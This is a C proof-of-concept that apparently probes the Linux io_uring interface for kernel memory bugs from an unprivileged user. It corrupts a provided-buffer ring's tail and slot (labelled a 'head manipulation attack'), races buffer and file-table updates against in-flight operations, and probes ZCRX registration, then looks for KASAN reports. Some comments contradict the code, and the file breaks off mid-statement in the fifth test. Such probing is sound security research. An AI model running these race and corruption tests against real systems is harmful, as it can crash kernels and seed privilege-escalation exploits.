/*
 * io_uring_poc.c
 *
 * io_uring attack-surface probe — Linux 6.18 / Ubuntu 24.04
 * Runs as an unprivileged user. No liburing dependency.
 * Compile: gcc -O2 -Wall -lpthread -o io_uring_poc io_uring_poc.c
 *
 * Tests:
 *   1. PBUF_RING head manipulation
 *   2. SEND_ZC fixed-buffer lifecycle race
 *   3. Ring mmap geometry / OOB SQE stress
 *   4. ZCRX interface probe (IORING_REGISTER_ZCRX_IFQ)
 *   5. Registered-files update race
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/types.h>
#include <linux/if.h>       /* IFNAMSIZ */
#include <poll.h>
#include <time.h>

/* ------------------------------------------------------------------ */
/* Syscall numbers (x86-64)                                            */
/* ------------------------------------------------------------------ */
#ifndef SYS_io_uring_setup
# define SYS_io_uring_setup    425
#endif
#ifndef SYS_io_uring_enter
# define SYS_io_uring_enter    426
#endif
#ifndef SYS_io_uring_register
# define SYS_io_uring_register 427
#endif

/* ------------------------------------------------------------------ */
/* io_uring constants                                                  */
/* ------------------------------------------------------------------ */
#define IORING_OP_NOP          0
#define IORING_OP_READV        1
#define IORING_OP_SEND         9
#define IORING_OP_RECV         10
#define IORING_OP_RECVMSG      12
#define IORING_OP_SEND_ZC      47

#define IORING_REGISTER_BUFFERS        0
#define IORING_REGISTER_BUFFERS_UPDATE 16
#define IORING_REGISTER_FILES          2
#define IORING_REGISTER_FILES_UPDATE   6
#define IORING_REGISTER_PBUF_RING      22
#define IORING_UNREGISTER_PBUF_RING    23
#define IORING_REGISTER_ZCRX_IFQ       27

#define IORING_ENTER_GETEVENTS  (1u << 0)
#define IORING_FEAT_SINGLE_MMAP (1u << 0)

#define IORING_OFF_SQ_RING  0ULL
#define IORING_OFF_CQ_RING  0x8000000ULL
#define IORING_OFF_SQES     0x10000000ULL

#define IOSQE_FIXED_FILE    (1u << 0)
#define IOSQE_BUFFER_SELECT (1u << 2)

/* ------------------------------------------------------------------ */
/* Raw kernel struct definitions                                       */
/* ------------------------------------------------------------------ */

struct io_uring_params {
    __u32 sq_entries;
    __u32 cq_entries;
    __u32 flags;
    __u32 sq_thread_cpu;
    __u32 sq_thread_idle;
    __u32 features;
    __u32 wq_fd;
    __u32 resv[3];
    /* io_sqring_offsets — 40 bytes (7 u32 fields + u32 resv1 + u64 user_addr) */
    struct {
        __u32 head, tail, ring_mask, ring_entries, flags, dropped, array;
        __u32 resv1;
        __u64 user_addr;
    } sq_off;
    /* io_cqring_offsets — 40 bytes */
    struct {
        __u32 head, tail, ring_mask, ring_entries, overflow, cqes, flags;
        __u32 resv1;
        __u64 user_addr;
    } cq_off;
};

struct io_uring_sqe {
    __u8  opcode;
    __u8  flags;
    __u16 ioprio;
    __s32 fd;
    union { __u64 off; __u64 addr2; };
    union { __u64 addr; };
    __u32 len;
    union { __u32 rw_flags; __u32 msg_flags; __u32 poll32_events;
            __u32 timeout_flags; __u32 accept_flags; __u32 open_flags;
            __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags;
            __u32 uring_cmd_flags; __u32 nop_flags; };
    __u64 user_data;
    union { __u16 buf_index; __u16 buf_group; };
    __u16 personality;
    union { __s32 splice_fd_in; __u32 file_index; };
    __u64 addr3;
    __u64 __pad2;
};

struct io_uring_cqe {
    __u64 user_data;
    __s32 res;
    __u32 flags;
};

/* Provided-buffer ring */
struct io_uring_buf {
    __u64 addr;
    __u32 len;
    __u16 bid;
    __u16 resv;
};

struct io_uring_buf_ring {
    union {
        /* Producer (user) side */
        struct {
            __u64 resv1;
            __u32 resv2;
            __u16 resv3;
            __u16 tail;
        };
        /* Consumer (kernel) side */
        struct io_uring_buf bufs[0];
    };
};

struct io_uring_buf_reg {
    __u64 ring_addr;
    __u32 ring_entries;
    __u16 bgid;
    __u16 flags;
    __u64 resv[3];
};

/* Buffer update descriptor */
struct io_uring_buf_status {
    __u32 buf_group;
    __u32 head;
    __u32 resv[2];
};

/* Fixed-buffer update */
struct io_uring_rsrc_update {
    __u32 offset;
    __u32 resv;
    __u64 data;    /* pointer to struct iovec */
};

/* Registered-files update */
struct io_uring_files_update {
    __u32 offset;
    __u32 resv;
    __u64 fds;     /* pointer to int[] */
};

/* ZCRX IFQ registration (kernel 6.16+) */
struct io_uring_zcrx_area_reg {
    __u64 addr;
    __u64 len;
    __u64 rq_area_token;
    __u16 flags;
    __u16 __pad[3];
};

struct io_uring_zcrx_ifq_reg {
    __u32 if_idx;
    __u32 if_rxq;
    __u32 rq_entries;
    __u32 flags;
    __u64 area_ptr;        /* pointer to io_uring_zcrx_area_reg */
    __u64 region_ptr;
    __u64 offsets;
    __u64 __resv[2];
};

/* ------------------------------------------------------------------ */
/* Ring handle                                                         */
/* ------------------------------------------------------------------ */
typedef struct {
    int   fd;
    void *sq_ring;
    void *cq_ring;
    void *sqes;
    struct io_uring_params params;
    size_t sq_ring_sz;
    size_t cq_ring_sz;

    /* cached offsets */
    volatile __u32 *sq_head;
    volatile __u32 *sq_tail;
    volatile __u32 *sq_mask;
    volatile __u32 *sq_entries;
    volatile __u32 *sq_array;
    volatile __u32 *cq_head;
    volatile __u32 *cq_tail;
    volatile __u32 *cq_mask;
    struct io_uring_cqe *cqes;
} ring_t;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */
#define LOG(fmt, ...) fprintf(stdout, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stdout, "[!] " fmt "\n", ##__VA_ARGS__)
#define FAIL(fmt, ...) fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)
#define OK(fmt, ...)   fprintf(stdout, "[+] " fmt "\n", ##__VA_ARGS__)

static inline long io_uring_setup(unsigned entries, struct io_uring_params *p)
{
    return syscall(SYS_io_uring_setup, entries, p);
}

static inline long io_uring_enter(int fd, unsigned to_submit,
                                  unsigned min_complete, unsigned flags,
                                  void *sig, size_t sigsz)
{
    return syscall(SYS_io_uring_enter, fd, to_submit, min_complete,
                   flags, sig, sigsz);
}

static inline long io_uring_register(int fd, unsigned opcode,
                                     void *arg, unsigned nr_args)
{
    return syscall(SYS_io_uring_register, fd, opcode, arg, nr_args);
}

/* Open a ring. Returns 0 on success. */
static int ring_open(ring_t *r, unsigned sq_entries, unsigned flags)
{
    memset(r, 0, sizeof(*r));
    r->params.flags = flags;

    long fd = io_uring_setup(sq_entries, &r->params);
    if (fd < 0) {
        FAIL("io_uring_setup(%u): %s", sq_entries, strerror(errno));
        return -1;
    }
    r->fd = (int)fd;

    int single = (r->params.features & IORING_FEAT_SINGLE_MMAP);

    /* SQ ring */
    r->sq_ring_sz = r->params.sq_off.array +
                    r->params.sq_entries * sizeof(__u32);
    /* CQ ring */
    r->cq_ring_sz = r->params.cq_off.cqes +
                    r->params.cq_entries * sizeof(struct io_uring_cqe);

    if (single) {
        size_t map_sz = r->sq_ring_sz > r->cq_ring_sz
                        ? r->sq_ring_sz : r->cq_ring_sz;
        r->sq_ring = mmap(NULL, map_sz, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE,
                          r->fd, IORING_OFF_SQ_RING);
        if (r->sq_ring == MAP_FAILED) {
            FAIL("mmap SQ ring: %s", strerror(errno));
            close(r->fd);
            return -1;
        }
        r->cq_ring = r->sq_ring;
        r->sq_ring_sz = map_sz;
        r->cq_ring_sz = 0; /* same mapping */
    } else {
        r->sq_ring = mmap(NULL, r->sq_ring_sz, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE,
                          r->fd, IORING_OFF_SQ_RING);
        r->cq_ring = mmap(NULL, r->cq_ring_sz, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE,
                          r->fd, IORING_OFF_CQ_RING);
        if (r->sq_ring == MAP_FAILED || r->cq_ring == MAP_FAILED) {
            FAIL("mmap rings: %s", strerror(errno));
            close(r->fd);
            return -1;
        }
    }

    /* SQEs */
    size_t sqe_sz = r->params.sq_entries * sizeof(struct io_uring_sqe);
    r->sqes = mmap(NULL, sqe_sz, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_POPULATE,
                   r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) {
        FAIL("mmap SQEs: %s", strerror(errno));
        close(r->fd);
        return -1;
    }

    /* Pointer aliases */
    char *sq = (char *)r->sq_ring;
    char *cq = (char *)r->cq_ring;

    r->sq_head    = (volatile __u32 *)(sq + r->params.sq_off.head);
    r->sq_tail    = (volatile __u32 *)(sq + r->params.sq_off.tail);
    r->sq_mask    = (volatile __u32 *)(sq + r->params.sq_off.ring_mask);
    r->sq_entries = (volatile __u32 *)(sq + r->params.sq_off.ring_entries);
    r->sq_array   = (volatile __u32 *)(sq + r->params.sq_off.array);

    r->cq_head    = (volatile __u32 *)(cq + r->params.cq_off.head);
    r->cq_tail    = (volatile __u32 *)(cq + r->params.cq_off.tail);
    r->cq_mask    = (volatile __u32 *)(cq + r->params.cq_off.ring_mask);
    r->cqes       = (struct io_uring_cqe *)(cq + r->params.cq_off.cqes);

    return 0;
}

static void ring_close(ring_t *r)
{
    if (r->fd > 0) close(r->fd);
}

/* Submit a single NOP and wait for its CQE. Returns CQE res. */
static int ring_submit_nop(ring_t *r, __u64 user_data)
{
    __u32 tail = *r->sq_tail;
    __u32 idx  = tail & *r->sq_mask;

    struct io_uring_sqe *sqe = (struct io_uring_sqe *)r->sqes + idx;
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode    = IORING_OP_NOP;
    sqe->user_data = user_data;

    r->sq_array[idx] = idx;
    __sync_synchronize();
    *r->sq_tail = tail + 1;
    __sync_synchronize();

    long ret = io_uring_enter(r->fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
    if (ret < 0) {
        FAIL("io_uring_enter: %s", strerror(errno));
        return -1;
    }

    /* Consume one CQE */
    __sync_synchronize();
    __u32 cq_head = *r->cq_head;
    if (*r->cq_tail == cq_head) return -1;

    struct io_uring_cqe *cqe = &r->cqes[cq_head & *r->cq_mask];
    int res = cqe->res;
    __sync_synchronize();
    *r->cq_head = cq_head + 1;
    return res;
}

/* ================================================================== */
/* TEST 1: PBUF_RING head manipulation                                 */
/* ================================================================== */
#define PBUF_ENTRIES 32

static void test_pbuf_ring_head(void)
{
    printf("\n=== TEST 1: PBUF_RING head manipulation ===\n");

    ring_t r;
    /* Declare all locals before any goto targets */
    char recv_bufs[PBUF_ENTRIES][64];
    void *pbuf_mem = NULL;
    size_t pbuf_ring_sz;
    size_t page;
    struct io_uring_buf_reg breg;
    struct io_uring_buf_ring *br;
    long ret;
    int sv[2];

    if (ring_open(&r, 64, 0) < 0) return;

    /* socketpair for recv */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        FAIL("socketpair: %s", strerror(errno));
        ring_close(&r);
        return;
    }

    /* Allocate the PBUF ring — must be page-aligned */
    pbuf_ring_sz = sizeof(struct io_uring_buf_ring) +
                   PBUF_ENTRIES * sizeof(struct io_uring_buf);
    page = (size_t)sysconf(_SC_PAGESIZE);
    pbuf_ring_sz = (pbuf_ring_sz + page - 1) & ~(page - 1);

    pbuf_mem = mmap(NULL, pbuf_ring_sz,
                    PROT_READ | PROT_WRITE,
                    MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (pbuf_mem == MAP_FAILED) {
        FAIL("mmap pbuf_ring: %s", strerror(errno));
        goto out_sock;
    }
    memset(pbuf_mem, 0, pbuf_ring_sz);

    /* Register the PBUF ring (bgid=1) */
    breg.ring_addr    = (__u64)(uintptr_t)pbuf_mem;
    breg.ring_entries = PBUF_ENTRIES;
    breg.bgid         = 1;
    breg.flags        = 0;
    memset(breg.resv, 0, sizeof(breg.resv));

    ret = io_uring_register(r.fd, IORING_REGISTER_PBUF_RING, &breg, 1);
    if (ret < 0) {
        FAIL("IORING_REGISTER_PBUF_RING: %s", strerror(errno));
        munmap(pbuf_mem, pbuf_ring_sz);
        pbuf_mem = NULL;
        goto out_sock;
    }
    OK("PBUF ring registered (bgid=1, %u entries)", (unsigned)PBUF_ENTRIES);

    /* Provide N buffers: fill all slots in the ring */
    br = (struct io_uring_buf_ring *)pbuf_mem;
    memset(recv_bufs, 0, sizeof(recv_bufs));
    { __u16 pbuf_tail = 0;

    for (__u32 i = 0; i < PBUF_ENTRIES; i++) {
        __u32 idx = pbuf_tail & (PBUF_ENTRIES - 1);
        br->bufs[idx].addr = (__u64)(uintptr_t)recv_bufs[i];
        br->bufs[idx].len  = 64;
        br->bufs[idx].bid  = (__u16)i;
        br->bufs[idx].resv = 0;
        pbuf_tail++;
    }
    /* Publish all buffers to the kernel */
    __sync_synchronize();
    br->tail = pbuf_tail;
    __sync_synchronize();
    OK("Published %u buffers to pbuf ring, tail=%u",
       (unsigned)PBUF_ENTRIES, (unsigned)pbuf_tail);

    /*
     * HEAD MANIPULATION ATTACK:
     * The kernel reads br->bufs[head & mask] when picking a buffer.
     * We force head to an out-of-bounds position BEFORE the kernel
     * services the recv, then submit a RECV with IOSQE_BUFFER_SELECT.
     *
     * Note: head is at bufs[0].bid (offset 14 within buf_ring), but
     * in the consumer view, head lives at offset 0 of the buf ring.
     * We write directly to the head field via the union alias.
     *
     * In a real kernel the "head" is maintained internally by the
     * kernel in io_buf_ring.tail_and_head. What we control on the
     * mmap'd page is the *tail* for the provider side.
     * The interesting case: tail wraps but kernel head is stale.
     *
     * Variant tested here: fill ring completely, then wrap tail
     * back to 0 (beyond ring capacity) and inject a bogus buffer
     * descriptor at slot 0.
     */

    /* Inject a bogus buffer at slot 0 — stale memory address */
    {
        static char bogus_buf[64];
        struct io_uring_sqe *sqe;
        __u32 sq_tail2, sq_idx, cq_head;
        memset(bogus_buf, 0x41, sizeof(bogus_buf));
        br->bufs[0].addr = (__u64)(uintptr_t)bogus_buf;
        br->bufs[0].len  = 64;
        br->bufs[0].bid  = 0xdead;
        __sync_synchronize();

        /* Wrap tail to cause ring_entries+1 (slot 0 again) */
        br->tail = (__u16)(PBUF_ENTRIES + 1);
        __sync_synchronize();
        LOG("Tail wrapped to %u (ring_entries=%u) — slot 0 now has bogus bid=0xdead",
            (unsigned)br->tail, (unsigned)PBUF_ENTRIES);

        /* Send data on sv[1] so the recv has something to consume */
        if (write(sv[1], "PBUF_FUZZ", 9) < 0)
            WARN("write to socket: %s", strerror(errno));

        /* Submit IORING_OP_RECV with IOSQE_BUFFER_SELECT on bgid=1 */
        sq_tail2 = *r.sq_tail;
        sq_idx   = sq_tail2 & *r.sq_mask;
        sqe = (struct io_uring_sqe *)r.sqes + sq_idx;
        memset(sqe, 0, sizeof(*sqe));
        sqe->opcode    = IORING_OP_RECV;
        sqe->fd        = sv[0];
        sqe->len       = 64;
        sqe->flags     = IOSQE_BUFFER_SELECT;
        sqe->buf_group = 1;
        sqe->user_data = 0xBEEF0001;

        r.sq_array[sq_idx] = sq_idx;
        __sync_synchronize();
        *r.sq_tail = sq_tail2 + 1;
        __sync_synchronize();

        ret = io_uring_enter(r.fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
        (void)ret;

        /* Drain CQE */
        cq_head = *r.cq_head;
        if (*r.cq_tail != cq_head) {
            struct io_uring_cqe *cqe = &r.cqes[cq_head & *r.cq_mask];
            LOG("RECV CQE: res=%d flags=0x%x user_data=0x%llx",
                cqe->res, cqe->flags, (unsigned long long)cqe->user_data);
            if (cqe->res > 0)
                OK("Recv succeeded — buffer id in cqe->flags>>16=0x%x",
                   cqe->flags >> 16);
            else
                LOG("Recv returned %d (%s)", cqe->res, strerror(-cqe->res));
            __sync_synchronize();
            *r.cq_head = cq_head + 1;
        }
    }

    /* Unregister */
    io_uring_register(r.fd, IORING_UNREGISTER_PBUF_RING, &breg, 1);
    if (pbuf_mem) munmap(pbuf_mem, pbuf_ring_sz);
    } /* end inner pbuf_tail block */
out_sock:
    close(sv[0]);
    close(sv[1]);
    ring_close(&r);
    WARN("check dmesg for KASAN/KFENCE");
}

/* ================================================================== */
/* TEST 2: SEND_ZC fixed-buffer lifecycle race                         */
/* ================================================================== */

/* Shared state for the updater thread */
struct zc_race_ctx {
    int ring_fd;
    volatile int stop;
    volatile int updates;
    struct iovec new_iov;
};

static void *updater_thread(void *arg)
{
    struct zc_race_ctx *ctx = (struct zc_race_ctx *)arg;
    struct io_uring_rsrc_update upd = {
        .offset = 0,
        .resv   = 0,
        .data   = (__u64)(uintptr_t)&ctx->new_iov,
    };
    while (!ctx->stop) {
        long r = io_uring_register(ctx->ring_fd,
                                   IORING_REGISTER_BUFFERS_UPDATE,
                                   &upd, 1);
        if (r == 0) ctx->updates++;
        /* tight loop — intentional */
    }
    return NULL;
}

static void test_send_zc_race(void)
{
    printf("\n=== TEST 2: SEND_ZC fixed-buffer lifecycle race ===\n");

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        FAIL("socketpair: %s", strerror(errno));
        return;
    }

    ring_t r;
    if (ring_open(&r, 64, 0) < 0) {
        close(sv[0]); close(sv[1]);
        return;
    }

    /* Allocate a send buffer */
    static char send_buf[4096];
    memset(send_buf, 0x42, sizeof(send_buf));

    /* Allocate a replacement buffer for the racing update */
    static char alt_buf[4096];
    memset(alt_buf, 0x43, sizeof(alt_buf));

    struct iovec iov = {
        .iov_base = send_buf,
        .iov_len  = sizeof(send_buf),
    };

    long ret = io_uring_register(r.fd, IORING_REGISTER_BUFFERS, &iov, 1);
    if (ret < 0) {
        FAIL("IORING_REGISTER_BUFFERS: %s", strerror(errno));
        ring_close(&r);
        close(sv[0]); close(sv[1]);
        return;
    }
    OK("Registered 1 fixed buffer (index 0, addr=%p, len=%zu)",
       iov.iov_base, iov.iov_len);

    /* Start updater thread */
    struct zc_race_ctx ctx = {
        .ring_fd = r.fd,
        .stop    = 0,
        .updates = 0,
        .new_iov = { .iov_base = alt_buf, .iov_len = sizeof(alt_buf) },
    };
    pthread_t tid;
    pthread_create(&tid, NULL, updater_thread, &ctx);

    /* Submit SEND_ZC using fixed buffer index 0 */
    const int ITERS = 500;
    for (int i = 0; i < ITERS; i++) {
        __u32 sq_tail = *r.sq_tail;
        __u32 idx = sq_tail & *r.sq_mask;
        struct io_uring_sqe *sqe = (struct io_uring_sqe *)r.sqes + idx;
        memset(sqe, 0, sizeof(*sqe));
        sqe->opcode     = IORING_OP_SEND_ZC;
        sqe->fd         = sv[0];
        sqe->addr       = (__u64)(uintptr_t)send_buf;
        sqe->len        = 64;
        sqe->flags      = IOSQE_FIXED_FILE;  /* use registered file */
        sqe->buf_index  = 0;                 /* fixed buffer #0 */
        sqe->user_data  = 0xBEEF2000ULL + i;
        /* Use the fixed buffer flag for ZC */
        sqe->uring_cmd_flags = 0;

        r.sq_array[idx] = idx;
        __sync_synchronize();
        *r.sq_tail = sq_tail + 1;
        __sync_synchronize();

        io_uring_enter(r.fd, 1, 0, 0, NULL, 0);
    }

    /* Stop racing thread */
    ctx.stop = 1;
    pthread_join(tid, NULL);
    LOG("Updater thread performed %d buffer updates during %d SEND_ZC submits",
        ctx.updates, ITERS);

    /* Drain CQEs */
    int cqe_count = 0;
    for (int i = 0; i < 200; i++) {
        __u32 cq_head = *r.cq_head;
        if (*r.cq_tail == cq_head) break;
        struct io_uring_cqe *cqe = &r.cqes[cq_head & *r.cq_mask];
        (void)cqe;
        cqe_count++;
        __sync_synchronize();
        *r.cq_head = cq_head + 1;
    }
    LOG("Drained %d CQEs", cqe_count);

    if (ctx.updates > 0)
        WARN("Buffer was updated %d times while SEND_ZC was in flight — "
             "check for KASAN UAF in io_send_zc_import", ctx.updates);

    ring_close(&r);
    close(sv[0]); close(sv[1]);
    WARN("check dmesg for KASAN/KFENCE");
}

/* ================================================================== */
/* TEST 3: Ring mmap geometry / OOB SQE stress                         */
/* ================================================================== */
static void test_ring_geometry(void)
{
    printf("\n=== TEST 3: Ring mmap geometry / OOB SQE stress ===\n");

    /* Use a small but non-trivial ring size (kernel rounds up to power of 2) */
    ring_t r;
    if (ring_open(&r, 4, 0) < 0) return;

    LOG("sq_entries=%u  cq_entries=%u  sq_mask=0x%x  cq_mask=0x%x",
        r.params.sq_entries, r.params.cq_entries,
        *r.sq_mask, *r.cq_mask);
    LOG("sq_off: head=%u tail=%u mask=%u entries=%u flags=%u dropped=%u array=%u",
        r.params.sq_off.head, r.params.sq_off.tail,
        r.params.sq_off.ring_mask, r.params.sq_off.ring_entries,
        r.params.sq_off.flags, r.params.sq_off.dropped,
        r.params.sq_off.array);
    LOG("cq_off: head=%u tail=%u mask=%u entries=%u overflow=%u cqes=%u flags=%u",
        r.params.cq_off.head, r.params.cq_off.tail,
        r.params.cq_off.ring_mask, r.params.cq_off.ring_entries,
        r.params.cq_off.overflow, r.params.cq_off.cqes,
        r.params.cq_off.flags);

    /*
     * OOB STRESS: rapidly submit NOPs.
     * The kernel must enforce sq_mask to prevent OOB in the SQE array.
     * Any write beyond params.sq_entries would be a guest-triggered OOB.
     * We submit 10 000 NOPs without advancing head (flood sq_tail).
     */
    /*
     * Stress: submit STRESS_N NOPs in batches of sq_entries.
     * We batch-fill the SQ ring, enter to submit+wait, then drain CQEs.
     * This confirms the kernel correctly bounds all accesses to the
     * allocated SQE/CQE arrays via sq_mask/cq_mask.
     */
    const int STRESS_N = 10000;
    int submitted = 0;
    int errors    = 0;
    int drained   = 0;
    __u32 sq_ents = r.params.sq_entries;

    for (int i = 0; i < STRESS_N; ) {
        /* Fill up to sq_entries SQEs */
        __u32 batch = (STRESS_N - i < (int)sq_ents) ? (STRESS_N - i) : sq_ents;
        for (__u32 b = 0; b < batch; b++, i++) {
            __u32 tail = *r.sq_tail;
            __u32 idx  = tail & *r.sq_mask;
            struct io_uring_sqe *sqe = (struct io_uring_sqe *)r.sqes + idx;
            memset(sqe, 0, sizeof(*sqe));
            sqe->opcode    = IORING_OP_NOP;
            sqe->user_data = (__u64)i;
            r.sq_array[idx] = idx;
            __sync_synchronize();
            *r.sq_tail = tail + 1;
        }
        __sync_synchronize();

        /* Submit batch and wait for completions */
        long ret = io_uring_enter(r.fd, batch, batch,
                                  IORING_ENTER_GETEVENTS, NULL, 0);
        if (ret < 0) {
            errors++;
        } else {
            submitted += (int)ret;
        }

        /* Drain CQEs */
        __sync_synchronize();
        for (__u32 b = 0; b < batch * 2; b++) {
            __u32 cq_head = *r.cq_head;
            if (*r.cq_tail == cq_head) break;
            drained++;
            __sync_synchronize();
            *r.cq_head = cq_head + 1;
            __sync_synchronize();
        }
    }

    LOG("Submitted %d NOPs: %d enter-errors, drained %d CQEs",
        submitted, errors, drained);
    if (errors == 0 && drained > 0)
        OK("Ring geometry enforced correctly — %d NOPs completed", drained);
    else if (errors > 0)
        WARN("enter errors=%d (check dmesg)", errors);
    else
        WARN("CQE drain yielded 0 — check ring mask: sq_mask=0x%x cq_mask=0x%x",
             *r.sq_mask, *r.cq_mask);

    ring_close(&r);
    WARN("check dmesg for KASAN/KFENCE");
}

/* ================================================================== */
/* TEST 4: ZCRX interface probe                                        */
/* ================================================================== */
static void test_zcrx_probe(void)
{
    printf("\n=== TEST 4: ZCRX interface probe (IORING_REGISTER_ZCRX_IFQ) ===\n");

    ring_t r;
    if (ring_open(&r, 8, 0) < 0) return;

    /*
     * Try to register a ZCRX IFQ against loopback (if_idx=1).
     * Expected results:
     *   EINVAL  — operation rejected (no ZCRX NIC / virtio doesn't support it)
     *   ENODEV  — network device not found
     *   EPERM   — missing CAP_NET_ADMIN
     *   ENOSYS  — compiled without ZCRX support
     *
     * We need an mmap'd area for the receive queue. Allocate a page.
     */
    size_t page = (size_t)sysconf(_SC_PAGESIZE);
    void *area_mem = mmap(NULL, page * 4,
                          PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (area_mem == MAP_FAILED) {
        FAIL("mmap zcrx area: %s", strerror(errno));
        ring_close(&r);
        return;
    }
    memset(area_mem, 0, page * 4);

    struct io_uring_zcrx_area_reg area_reg = {
        .addr          = (__u64)(uintptr_t)area_mem,
        .len           = page * 4,
        .rq_area_token = 0,
        .flags         = 0,
    };

    struct io_uring_zcrx_ifq_reg ifq_reg = {
        .if_idx     = 1,          /* lo = 1 on most systems */
        .if_rxq     = 0,
        .rq_entries = 64,
        .flags      = 0,
        .area_ptr   = (__u64)(uintptr_t)&area_reg,
        .region_ptr = 0,
        .offsets    = 0,
    };

    long ret = io_uring_register(r.fd, IORING_REGISTER_ZCRX_IFQ,
                                 &ifq_reg, 1);
    if (ret == 0) {
        WARN("ZCRX IFQ registered successfully on loopback — unexpected!");
    } else {
        int e = errno;
        LOG("IORING_REGISTER_ZCRX_IFQ -> errno=%d (%s)", e, strerror(e));
        switch (e) {
        case EINVAL:
            OK("EINVAL: interface exists but lacks ZCRX NIC support "
               "(virtio/loopback can't do zero-copy RX)");
            break;
        case ENODEV:
            OK("ENODEV: network device index %u not found", ifq_reg.if_idx);
            break;
        case EPERM:
            OK("EPERM: CAP_NET_ADMIN required for ZCRX");
            break;
        case EOPNOTSUPP:
            OK("EOPNOTSUPP: driver does not implement ndo_rx_queue_setup");
            break;
        case ENOSYS:
            OK("ENOSYS: CONFIG_IO_URING_ZCRX not compiled in");
            break;
        default:
            WARN("Unexpected errno %d (%s)", e, strerror(e));
        }
    }

    /*
     * Document the attack surface:
     * If a real ZCRX-capable NIC (mlx5, bnxt) is present, the kernel
     * will map NIC RX ring memory directly into userspace. The area_reg
     * struct allows an attacker with CAP_NET_ADMIN to:
     *   - Control the rq_area_token for the refill queue
     *   - Map DMA memory accessible to both NIC and userspace
     * Without CAP_NET_ADMIN this path is not reachable from unprivileged
     * context, but registration bugs (TOCTOU in area_reg validation) may
     * be triggerable before the privilege check.
     */
    LOG("ZCRX struct layout: io_uring_zcrx_ifq_reg size=%zu bytes",
        sizeof(struct io_uring_zcrx_ifq_reg));
    LOG("  if_idx   @ offset 0 (u32)");
    LOG("  if_rxq   @ offset 4 (u32)");
    LOG("  rq_entries @ offset 8 (u32)");
    LOG("  flags    @ offset 12 (u32)");
    LOG("  area_ptr @ offset 16 (u64) -> io_uring_zcrx_area_reg");
    LOG("  region_ptr @ offset 24 (u64)");
    LOG("  offsets  @ offset 32 (u64)");

    munmap(area_mem, page * 4);
    ring_close(&r);
    WARN("check dmesg for KASAN/KFENCE");
}

/* ================================================================== */
/* TEST 5: Registered-files update race                                */
/* ================================================================== */

struct files_race_ctx {
    int ring_fd;
    volatile int stop;
    volatile long updates;
    int new_fds[16];
    int n_fds;
};

static void *files_updater_thread(void *arg)
{
    struct files_race_ctx *ctx = (struct files_race_ctx *)arg;

    while (!ctx->stop) {
        for (int i = 0; i < ctx->n_fds; i++) {
            struct io_uring_files_update upd = {
                .offset = (__u32)i,
                .resv   = 0,
                .fds    = (__u64)(uintptr_t)&ctx->new_fds[i],
            };
            long r = io_uring_register(ctx->ring_fd,
                                       IORING_REGISTER_FILES_UPDATE,
                                       &upd, 1);
            if (r == 0) ctx->updates++;
        }
    }
    return NULL;
}

static void test_files_race(void)
{
    printf("\n=== TEST 5: Registered-files update race ===\n");

    ring_t r;
    if (ring_open(&r, 64, 0) < 0) return;

    /* Create a bunch of file descriptors to register */
    const int N = 16;
    int fds[N], alt_fds[N];
    for (int i = 0; i < N; i++) {
        fds[i] = open("/dev/null", O_RDONLY);
        if (fds[i] < 0) {
            FAIL("open /dev/null: %s", strerror(errno));
            ring_close(&r);
            return;
        }
        alt_fds[i] = open("/dev/zero", O_RDONLY);
        if (alt_fds[i] < 0) {
            FAIL("open /dev/zero: %s", strerror(errno));
            ring_close(&r);
            return;
        }
    }

    long ret = io_uring_register(r.fd, IORING_REGISTER_FILES, fds, N);
    if (ret < 0) {
        FAIL("IORING_REGISTER_FILES: %s", strerror(errno));
        goto out;
    }
    OK("Registered %d files in fixed file table", N);

    /* Start racing thread that updates file table entries */
    struct files_race_ctx ctx = {
        .ring_fd = r.fd,
        .stop    = 0,
        .updates = 0,
        .n_fds   = N,
    };
    memcpy(ctx.new_fds, alt_fds, sizeof(int) * N);

    pthread_t tid;
    pthread_create(&tid, NULL, files_updater_thread, &ctx);

    /*
     * Meanwhile: submit NOP ops that use fixed file slots.
     * (NOP doesn't actually use the fd, but we exercise the
     *  registration table's refcount path.)
     *
     * For a real trigger, IORING_OP_READV with IOSQE_FIXED_FILE
     * would exercise io_fixed_fd_install; we use NOP here to keep
     * the test safe to run.
     */
    const int ITERS = 5000;
    for (int i = 0; i < ITERS; i++) {
        __u32 tail = *r.sq_tail;
        __u32 idx  = tail & *r.sq_mask;
        struct io_uring_sqe *sqe = (struct io_uring_sqe *)r.sqes + idx;
        memset(sqe, 0, sizeof(*sqe));
        sqe->opcode     = IORING_OP_NOP;
        sqe->flags      = IOSQE_FIXED_FILE;
        sqe->fd         = i % N;          /* fixed file index */
        sqe->user_data  = (__u64)i;

        r.sq_array[idx] = idx;
        __sync_synchronize();
        *r.sq_tail = tail + 1;
        __sync_synchronize();

        io_uring_enter(r.fd, 1, 0, 0, NULL, 0);
    }

    ctx.stop = 1;
    pthread_join(tid, NULL);
    LOG("File-table update thread performed %ld swaps during %d NOP submissions",
        ctx.updates, ITERS);

    /* Drain CQEs */
    int drained = 0;
    for (int i = 0; i < ITERS + 10; i++) {
        __u32 cq_head = *r.cq_head;
        if (*r.cq_tail == cq_head) break;
        drained++;
        __sync_synchronize();
        *r.cq_head = cq_head + 1;
    }
    LOG("Drained %d CQEs", drained);

    if (ctx.updates > 0)
